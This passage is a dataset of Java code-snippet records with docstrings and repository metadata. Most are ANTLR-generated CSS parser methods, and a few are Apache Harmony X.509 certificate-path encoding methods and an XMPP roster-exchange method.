FOLLOW_31_in_args648);\n                                stream_31.add(char_literal58);\n\n\n                            }\n                            break;\n\n                        }\n\n                        pushFollow(FOLLOW_expr_in_args651);\n                        expr59 = expr();\n\n                        state._fsp--;\n\n                        stream_expr.add(expr59.getTree());\n\n                    }\n                    break;\n\n                    default:\n                        break loop24;\n                }\n            }\n            while (true);\n\n\n            // AST REWRITE\n            // elements: expr\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 108:22: -> ( expr )*\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:108:25: ( expr )*\n                while (stream_expr.hasNext()) {\n                    adaptor.addChild(root_0, stream_expr.nextTree());\n\n                }\n                stream_expr.reset();\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"selectorOperation\"\n// /home/langera/dev/freud/src/grammar/Css.g:68:1: selectorOperation : ( selectop )? elem -> ( selectop )* elem ;\n", "func_signal": "public final CssParser.selectorOperation_return selectorOperation() throws RecognitionException", "code": "{\n    CssParser.selectorOperation_return retval = new CssParser.selectorOperation_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    CssParser.selectop_return selectop27 = null;\n\n    CssParser.elem_return elem28 = null;\n\n\n    RewriteRuleSubtreeStream stream_elem = new RewriteRuleSubtreeStream(adaptor, \"rule elem\");\n    RewriteRuleSubtreeStream stream_selectop = new RewriteRuleSubtreeStream(adaptor, \"rule selectop\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:69:2: ( ( selectop )? elem -> ( selectop )* elem )\n        // /home/langera/dev/freud/src/grammar/Css.g:69:4: ( selectop )? elem\n        {\n            // /home/langera/dev/freud/src/grammar/Css.g:69:4: ( selectop )?\n            int alt13 = 2;\n            int LA13_0 = input.LA(1);\n\n            if (((LA13_0 >= 32 && LA13_0 <= 33))) {\n                alt13 = 1;\n            }\n            switch (alt13) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:69:4: selectop\n                {\n                    pushFollow(FOLLOW_selectop_in_selectorOperation342);\n                    selectop27 = selectop();\n\n                    state._fsp--;\n\n                    stream_selectop.add(selectop27.getTree());\n\n                }\n                break;\n\n            }\n\n            pushFollow(FOLLOW_elem_in_selectorOperation345);\n            elem28 = elem();\n\n            state._fsp--;\n\n            stream_elem.add(elem28.getTree());\n\n\n            // AST REWRITE\n            // elements: selectop, elem\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 69:19: -> ( selectop )* elem\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:69:22: ( selectop )*\n                while (stream_selectop.hasNext()) {\n                    adaptor.addChild(root_0, stream_selectop.nextTree());\n\n                }\n                stream_selectop.reset();\n                adaptor.addChild(root_0, stream_elem.nextTree());\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"attribRelate\"\n// /home/langera/dev/freud/src/grammar/Css.g:97:1: attribRelate : ( '=' -> ATTRIBEQUAL | '~=' -> HASVALUE | '|=' -> BEGINSWITH );\n", "func_signal": "public final CssParser.attribRelate_return attribRelate() throws RecognitionException", "code": "{\n    CssParser.attribRelate_return retval = new CssParser.attribRelate_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal51 = null;\n    Token string_literal52 = null;\n    Token string_literal53 = null;\n\n    CommonTree char_literal51_tree = null;\n    CommonTree string_literal52_tree = null;\n    CommonTree string_literal53_tree = null;\n    RewriteRuleTokenStream stream_43 = new RewriteRuleTokenStream(adaptor, \"token 43\");\n    RewriteRuleTokenStream stream_44 = new RewriteRuleTokenStream(adaptor, \"token 44\");\n    RewriteRuleTokenStream stream_42 = new RewriteRuleTokenStream(adaptor, \"token 42\");\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:98:2: ( '=' -> ATTRIBEQUAL | '~=' -> HASVALUE | '|=' -> BEGINSWITH )\n        int alt22 = 3;\n        switch (input.LA(1)) {\n            case 42: {\n                alt22 = 1;\n            }\n            break;\n            case 43: {\n                alt22 = 2;\n            }\n            break;\n            case 44: {\n                alt22 = 3;\n            }\n            break;\n            default:\n                NoViableAltException nvae =\n                        new NoViableAltException(\"\", 22, 0, input);\n\n                throw nvae;\n        }\n\n        switch (alt22) {\n            case 1:\n                // /home/langera/dev/freud/src/grammar/Css.g:98:4: '='\n            {\n                char_literal51 = (Token) match(input, 42, FOLLOW_42_in_attribRelate581);\n                stream_42.add(char_literal51);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 98:9: -> ATTRIBEQUAL\n                {\n                    adaptor.addChild(root_0, (CommonTree) adaptor.create(ATTRIBEQUAL, \"ATTRIBEQUAL\"));\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 2:\n                // /home/langera/dev/freud/src/grammar/Css.g:99:4: '~='\n            {\n                string_literal52 = (Token) match(input, 43, FOLLOW_43_in_attribRelate591);\n                stream_43.add(string_literal52);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 99:9: -> HASVALUE\n                {\n                    adaptor.addChild(root_0, (CommonTree) adaptor.create(HASVALUE, \"HASVALUE\"));\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 3:\n                // /home/langera/dev/freud/src/grammar/Css.g:100:4: '|='\n            {\n                string_literal53 = (Token) match(input, 44, FOLLOW_44_in_attribRelate600);\n                stream_44.add(string_literal53);\n\n\n                // AST REWRITE\n                // elements:\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 100:9: -> BEGINSWITH\n                {\n                    adaptor.addChild(root_0, (CommonTree) adaptor.create(BEGINSWITH, \"BEGINSWITH\"));\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n\n        }\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"properties\"\n// /home/langera/dev/freud/src/grammar/Css.g:77:1: properties : declaration ( ';' ( declaration )? )* -> ( declaration )+ ;\n", "func_signal": "public final CssParser.properties_return properties() throws RecognitionException", "code": "{\n    CssParser.properties_return retval = new CssParser.properties_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal32 = null;\n    CssParser.declaration_return declaration31 = null;\n\n    CssParser.declaration_return declaration33 = null;\n\n\n    CommonTree char_literal32_tree = null;\n    RewriteRuleTokenStream stream_34 = new RewriteRuleTokenStream(adaptor, \"token 34\");\n    RewriteRuleSubtreeStream stream_declaration = new RewriteRuleSubtreeStream(adaptor, \"rule declaration\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:78:2: ( declaration ( ';' ( declaration )? )* -> ( declaration )+ )\n        // /home/langera/dev/freud/src/grammar/Css.g:78:4: declaration ( ';' ( declaration )? )*\n        {\n            pushFollow(FOLLOW_declaration_in_properties395);\n            declaration31 = declaration();\n\n            state._fsp--;\n\n            stream_declaration.add(declaration31.getTree());\n            // /home/langera/dev/freud/src/grammar/Css.g:78:16: ( ';' ( declaration )? )*\n            loop16:\n            do {\n                int alt16 = 2;\n                int LA16_0 = input.LA(1);\n\n                if ((LA16_0 == 34)) {\n                    alt16 = 1;\n                }\n\n\n                switch (alt16) {\n                    case 1:\n                        // /home/langera/dev/freud/src/grammar/Css.g:78:17: ';' ( declaration )?\n                    {\n                        char_literal32 = (Token) match(input, 34, FOLLOW_34_in_properties398);\n                        stream_34.add(char_literal32);\n\n                        // /home/langera/dev/freud/src/grammar/Css.g:78:21: ( declaration )?\n                        int alt15 = 2;\n                        int LA15_0 = input.LA(1);\n\n                        if ((LA15_0 == IDENT)) {\n                            alt15 = 1;\n                        }\n                        switch (alt15) {\n                            case 1:\n                                // /home/langera/dev/freud/src/grammar/Css.g:78:21: declaration\n                            {\n                                pushFollow(FOLLOW_declaration_in_properties400);\n                                declaration33 = declaration();\n\n                                state._fsp--;\n\n                                stream_declaration.add(declaration33.getTree());\n\n                            }\n                            break;\n\n                        }\n\n\n                    }\n                    break;\n\n                    default:\n                        break loop16;\n                }\n            }\n            while (true);\n\n\n            // AST REWRITE\n            // elements: declaration\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 78:36: -> ( declaration )+\n            {\n                if (!(stream_declaration.hasNext())) {\n                    throw new RewriteEarlyExitException();\n                }\n                while (stream_declaration.hasNext()) {\n                    adaptor.addChild(root_0, stream_declaration.nextTree());\n\n                }\n                stream_declaration.reset();\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"expr\"\n// /home/langera/dev/freud/src/grammar/Css.g:111:1: expr : ( ( IDENT unit ) | IDENT | '#' IDENT -> ^( COLOUR '#' IDENT ) | '.' IDENT | function );\n", "func_signal": "public final CssParser.expr_return expr() throws RecognitionException", "code": "{\n    CssParser.expr_return retval = new CssParser.expr_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token IDENT60 = null;\n    Token IDENT62 = null;\n    Token char_literal63 = null;\n    Token IDENT64 = null;\n    Token char_literal65 = null;\n    Token IDENT66 = null;\n    CssParser.unit_return unit61 = null;\n\n    CssParser.function_return function67 = null;\n\n\n    CommonTree IDENT60_tree = null;\n    CommonTree IDENT62_tree = null;\n    CommonTree char_literal63_tree = null;\n    CommonTree IDENT64_tree = null;\n    CommonTree char_literal65_tree = null;\n    CommonTree IDENT66_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_36 = new RewriteRuleTokenStream(adaptor, \"token 36\");\n\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:112:2: ( ( IDENT unit ) | IDENT | '#' IDENT -> ^( COLOUR '#' IDENT ) | '.' IDENT | function )\n        int alt25 = 5;\n        alt25 = dfa25.predict(input);\n        switch (alt25) {\n            case 1:\n                // /home/langera/dev/freud/src/grammar/Css.g:112:4: ( IDENT unit )\n            {\n                root_0 = (CommonTree) adaptor.nil();\n\n                // /home/langera/dev/freud/src/grammar/Css.g:112:4: ( IDENT unit )\n                // /home/langera/dev/freud/src/grammar/Css.g:112:5: IDENT unit\n                {\n                    IDENT60 = (Token) match(input, IDENT, FOLLOW_IDENT_in_expr670);\n                    IDENT60_tree = (CommonTree) adaptor.create(IDENT60);\n                    adaptor.addChild(root_0, IDENT60_tree);\n\n                    pushFollow(FOLLOW_unit_in_expr672);\n                    unit61 = unit();\n\n                    state._fsp--;\n\n                    adaptor.addChild(root_0, unit61.getTree());\n\n                }\n\n\n            }\n            break;\n            case 2:\n                // /home/langera/dev/freud/src/grammar/Css.g:113:4: IDENT\n            {\n                root_0 = (CommonTree) adaptor.nil();\n\n                IDENT62 = (Token) match(input, IDENT, FOLLOW_IDENT_in_expr678);\n                IDENT62_tree = (CommonTree) adaptor.create(IDENT62);\n                adaptor.addChild(root_0, IDENT62_tree);\n\n\n            }\n            break;\n            case 3:\n                // /home/langera/dev/freud/src/grammar/Css.g:114:4: '#' IDENT\n            {\n                char_literal63 = (Token) match(input, 36, FOLLOW_36_in_expr683);\n                stream_36.add(char_literal63);\n\n                IDENT64 = (Token) match(input, IDENT, FOLLOW_IDENT_in_expr685);\n                stream_IDENT.add(IDENT64);\n\n\n                // AST REWRITE\n                // elements: 36, IDENT\n                // token labels:\n                // rule labels: retval\n                // token list labels:\n                // rule list labels:\n                // wildcard labels:\n                retval.tree = root_0;\n                RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n                root_0 = (CommonTree) adaptor.nil();\n                // 114:14: -> ^( COLOUR '#' IDENT )\n                {\n                    // /home/langera/dev/freud/src/grammar/Css.g:114:17: ^( COLOUR '#' IDENT )\n                    {\n                        CommonTree root_1 = (CommonTree) adaptor.nil();\n                        root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(COLOUR, \"COLOUR\"), root_1);\n\n                        adaptor.addChild(root_1, stream_36.nextNode());\n                        adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        adaptor.addChild(root_0, root_1);\n                    }\n\n                }\n\n                retval.tree = root_0;\n            }\n            break;\n            case 4:\n                // /home/langera/dev/freud/src/grammar/Css.g:115:4: '.' IDENT\n            {\n                root_0 = (CommonTree) adaptor.nil();\n\n                char_literal65 = (Token) match(input, 37, FOLLOW_37_in_expr702);\n                char_literal65_tree = (CommonTree) adaptor.create(char_literal65);\n                adaptor.addChild(root_0, char_literal65_tree);\n\n                IDENT66 = (Token) match(input, IDENT, FOLLOW_IDENT_in_expr704);\n                IDENT66_tree = (CommonTree) adaptor.create(IDENT66);\n                adaptor.addChild(root_0, IDENT66_tree);\n\n\n            }\n            break;\n            case 5:\n                // /home/langera/dev/freud/src/grammar/Css.g:116:4: function\n            {\n                root_0 = (CommonTree) adaptor.nil();\n\n                pushFollow(FOLLOW_function_in_expr709);\n                function67 = function();\n\n                state._fsp--;\n\n                adaptor.addChild(root_0, function67.getTree());\n\n            }\n            break;\n\n        }\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"attrib\"\n// /home/langera/dev/freud/src/grammar/Css.g:93:1: attrib : '[' IDENT ( attribRelate IDENT )? ']' -> ^( ATTRIB IDENT ( attribRelate ( IDENT )* )? ) ;\n", "func_signal": "public final CssParser.attrib_return attrib() throws RecognitionException", "code": "{\n    CssParser.attrib_return retval = new CssParser.attrib_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal46 = null;\n    Token IDENT47 = null;\n    Token IDENT49 = null;\n    Token char_literal50 = null;\n    CssParser.attribRelate_return attribRelate48 = null;\n\n\n    CommonTree char_literal46_tree = null;\n    CommonTree IDENT47_tree = null;\n    CommonTree IDENT49_tree = null;\n    CommonTree char_literal50_tree = null;\n    RewriteRuleTokenStream stream_IDENT = new RewriteRuleTokenStream(adaptor, \"token IDENT\");\n    RewriteRuleTokenStream stream_41 = new RewriteRuleTokenStream(adaptor, \"token 41\");\n    RewriteRuleTokenStream stream_40 = new RewriteRuleTokenStream(adaptor, \"token 40\");\n    RewriteRuleSubtreeStream stream_attribRelate = new RewriteRuleSubtreeStream(adaptor, \"rule attribRelate\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:94:2: ( '[' IDENT ( attribRelate IDENT )? ']' -> ^( ATTRIB IDENT ( attribRelate ( IDENT )* )? ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:94:4: '[' IDENT ( attribRelate IDENT )? ']'\n        {\n            char_literal46 = (Token) match(input, 40, FOLLOW_40_in_attrib540);\n            stream_40.add(char_literal46);\n\n            IDENT47 = (Token) match(input, IDENT, FOLLOW_IDENT_in_attrib542);\n            stream_IDENT.add(IDENT47);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:94:14: ( attribRelate IDENT )?\n            int alt21 = 2;\n            int LA21_0 = input.LA(1);\n\n            if (((LA21_0 >= 42 && LA21_0 <= 44))) {\n                alt21 = 1;\n            }\n            switch (alt21) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:94:15: attribRelate IDENT\n                {\n                    pushFollow(FOLLOW_attribRelate_in_attrib545);\n                    attribRelate48 = attribRelate();\n\n                    state._fsp--;\n\n                    stream_attribRelate.add(attribRelate48.getTree());\n                    IDENT49 = (Token) match(input, IDENT, FOLLOW_IDENT_in_attrib547);\n                    stream_IDENT.add(IDENT49);\n\n\n                }\n                break;\n\n            }\n\n            char_literal50 = (Token) match(input, 41, FOLLOW_41_in_attrib551);\n            stream_41.add(char_literal50);\n\n\n            // AST REWRITE\n            // elements: attribRelate, IDENT, IDENT\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 94:40: -> ^( ATTRIB IDENT ( attribRelate ( IDENT )* )? )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:94:43: ^( ATTRIB IDENT ( attribRelate ( IDENT )* )? )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(ATTRIB, \"ATTRIB\"), root_1);\n\n                    adaptor.addChild(root_1, stream_IDENT.nextNode());\n                    // /home/langera/dev/freud/src/grammar/Css.g:94:59: ( attribRelate ( IDENT )* )?\n                    if (stream_attribRelate.hasNext() || stream_IDENT.hasNext()) {\n                        adaptor.addChild(root_1, stream_attribRelate.nextTree());\n                        // /home/langera/dev/freud/src/grammar/Css.g:94:73: ( IDENT )*\n                        while (stream_IDENT.hasNext()) {\n                            adaptor.addChild(root_1, stream_IDENT.nextNode());\n\n                        }\n                        stream_IDENT.reset();\n\n                    }\n                    stream_attribRelate.reset();\n                    stream_IDENT.reset();\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "// $ANTLR start \"ruleset\"\n// /home/langera/dev/freud/src/grammar/Css.g:56:1: ruleset : selectors '{' ( properties )? '}' -> ^( RULE selectors ( properties )* ) ;\n", "func_signal": "public final CssParser.ruleset_return ruleset() throws RecognitionException", "code": "{\n    CssParser.ruleset_return retval = new CssParser.ruleset_return();\n    retval.start = input.LT(1);\n\n    CommonTree root_0 = null;\n\n    Token char_literal17 = null;\n    Token char_literal19 = null;\n    CssParser.selectors_return selectors16 = null;\n\n    CssParser.properties_return properties18 = null;\n\n\n    CommonTree char_literal17_tree = null;\n    CommonTree char_literal19_tree = null;\n    RewriteRuleTokenStream stream_30 = new RewriteRuleTokenStream(adaptor, \"token 30\");\n    RewriteRuleTokenStream stream_29 = new RewriteRuleTokenStream(adaptor, \"token 29\");\n    RewriteRuleSubtreeStream stream_selectors = new RewriteRuleSubtreeStream(adaptor, \"rule selectors\");\n    RewriteRuleSubtreeStream stream_properties = new RewriteRuleSubtreeStream(adaptor, \"rule properties\");\n    try {\n        // /home/langera/dev/freud/src/grammar/Css.g:57:3: ( selectors '{' ( properties )? '}' -> ^( RULE selectors ( properties )* ) )\n        // /home/langera/dev/freud/src/grammar/Css.g:57:5: selectors '{' ( properties )? '}'\n        {\n            pushFollow(FOLLOW_selectors_in_ruleset257);\n            selectors16 = selectors();\n\n            state._fsp--;\n\n            stream_selectors.add(selectors16.getTree());\n            char_literal17 = (Token) match(input, 29, FOLLOW_29_in_ruleset259);\n            stream_29.add(char_literal17);\n\n            // /home/langera/dev/freud/src/grammar/Css.g:57:19: ( properties )?\n            int alt8 = 2;\n            int LA8_0 = input.LA(1);\n\n            if ((LA8_0 == IDENT)) {\n                alt8 = 1;\n            }\n            switch (alt8) {\n                case 1:\n                    // /home/langera/dev/freud/src/grammar/Css.g:57:19: properties\n                {\n                    pushFollow(FOLLOW_properties_in_ruleset261);\n                    properties18 = properties();\n\n                    state._fsp--;\n\n                    stream_properties.add(properties18.getTree());\n\n                }\n                break;\n\n            }\n\n            char_literal19 = (Token) match(input, 30, FOLLOW_30_in_ruleset264);\n            stream_30.add(char_literal19);\n\n\n            // AST REWRITE\n            // elements: selectors, properties\n            // token labels:\n            // rule labels: retval\n            // token list labels:\n            // rule list labels:\n            // wildcard labels:\n            retval.tree = root_0;\n            RewriteRuleSubtreeStream stream_retval = new RewriteRuleSubtreeStream(adaptor, \"rule retval\", retval != null ? retval.tree : null);\n\n            root_0 = (CommonTree) adaptor.nil();\n            // 57:35: -> ^( RULE selectors ( properties )* )\n            {\n                // /home/langera/dev/freud/src/grammar/Css.g:57:38: ^( RULE selectors ( properties )* )\n                {\n                    CommonTree root_1 = (CommonTree) adaptor.nil();\n                    root_1 = (CommonTree) adaptor.becomeRoot((CommonTree) adaptor.create(RULE, \"RULE\"), root_1);\n\n                    adaptor.addChild(root_1, stream_selectors.nextTree());\n                    // /home/langera/dev/freud/src/grammar/Css.g:57:56: ( properties )*\n                    while (stream_properties.hasNext()) {\n                        adaptor.addChild(root_1, stream_properties.nextTree());\n\n                    }\n                    stream_properties.reset();\n\n                    adaptor.addChild(root_0, root_1);\n                }\n\n            }\n\n            retval.tree = root_0;\n        }\n\n        retval.stop = input.LT(-1);\n\n        retval.tree = (CommonTree) adaptor.rulePostProcessing(root_0);\n        adaptor.setTokenBoundaries(retval.tree, retval.start, retval.stop);\n\n    }\n    catch (RecognitionException re) {\n        reportError(re);\n        recover(input, re);\n        retval.tree = (CommonTree) adaptor.errorNode(input, retval.start, input.LT(-1), re);\n\n    }\n    finally {\n    }\n    return retval;\n}", "path": "css\\src\\main\\java\\org\\freud\\analysed\\css\\parser\\CssParser.java", "repo_name": "LMAX-Exchange/freud", "stars": 121, "license": "apache-2.0", "language": "java", "size": 6788}
{"docstring": "/**\n * Returns ASN.1 encoded form of this X.509 TBSCertList value.\n * \n * @return a byte array containing ASN.1 encode form.\n */\n", "func_signal": "public byte[] getEncoded()", "code": "{\n\tif (encoding == null) {\n\t\tencoding = CertificateList.ASN1.encode(this);\n\t}\n\treturn encoding;\n}", "path": "src\\org\\apache\\harmony\\security\\x509\\CertificateList.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * @see java.security.cert.CertPath#getEncoded() method documentation for\n *      more info\n */\n", "func_signal": "@Override\npublic byte[] getEncoded() throws CertificateEncodingException", "code": "{\n\tif (pkiPathEncoding == null) {\n\t\tpkiPathEncoding = ASN1.encode(this);\n\t}\n\tfinal byte[] result = new byte[pkiPathEncoding.length];\n\tSystem.arraycopy(pkiPathEncoding, 0, result, 0, pkiPathEncoding.length);\n\treturn result;\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "// stub to prevent using the instance as decoder\n", "func_signal": "@Override\npublic Object decode(BerInputStream in) throws IOException", "code": "{\n\tthrow new RuntimeException(\n\t\t\t\"Invalid use of encoder for PKCS#7 SignedData object\");\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Adds a remote roster entry to the packet.\n * \n * @param remoteRosterEntry\n *            a remote roster entry to add.\n */\n", "func_signal": "public void addRosterEntry(RemoteRosterEntry remoteRosterEntry)", "code": "{\n\tsynchronized (remoteRosterEntries) {\n\t\tremoteRosterEntries.add(remoteRosterEntry);\n\t}\n}", "path": "src\\org\\jivesoftware\\smackx\\packet\\RosterExchange.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
{"docstring": "/**\n * Generates certification path object on the base of encoding provided via\n * array of bytes. The format of provided encoded form is specified by\n * parameter <code>encoding</code>.\n * \n * @throws CertificateException\n *             if specified encoding form is not supported, or some problems\n *             occurred during the decoding.\n */\n", "func_signal": "public static X509CertPathImpl getInstance(byte[] in, String encoding)\n\t\tthrows CertificateException", "code": "{\n\tif (!encodings.contains(encoding)) {\n\t\tthrow new CertificateException(Messages.getString(\n\t\t\t\t\"security.15F\", encoding)); //$NON-NLS-1$\n\t}\n\ttry {\n\t\tif (encodingsArr[0].equals(encoding)) {\n\t\t\t// generate the object from PkiPath encoded form\n\t\t\treturn (X509CertPathImpl) ASN1.decode(in);\n\t\t} else {\n\t\t\t// generate the object from PKCS #7 encoded form\n\t\t\tfinal ContentInfo ci = (ContentInfo) ContentInfo.ASN1\n\t\t\t\t\t.decode(in);\n\t\t\tfinal SignedData sd = ci.getSignedData();\n\t\t\tif (sd == null) {\n\t\t\t\tthrow new CertificateException(\n\t\t\t\t\t\tMessages.getString(\"security.160\")); //$NON-NLS-1$\n\t\t\t}\n\t\t\tList<Certificate> certs = sd.getCertificates();\n\t\t\tif (certs == null) {\n\t\t\t\tcerts = new ArrayList<Certificate>();\n\t\t\t}\n\t\t\tfinal List<X509Certificate> result = new ArrayList<X509Certificate>();\n\t\t\tfor (int i = 0; i < certs.size(); i++) {\n\t\t\t\tresult.add(new X509CertImpl(certs.get(i)));\n\t\t\t}\n\t\t\treturn new X509CertPathImpl(result, PKCS7, ci.getEncoded());\n\t\t}\n\t} catch (final IOException e) {\n\t\tthrow new CertificateException(Messages.getString(\"security.15E\", //$NON-NLS-1$\n\t\t\t\te.getMessage()));\n\t}\n}", "path": "src\\org\\apache\\harmony\\security\\provider\\cert\\X509CertPathImpl.java", "repo_name": "mar-v-in/XMPP-for-Android", "stars": 80, "license": "other", "language": "java", "size": 46442}
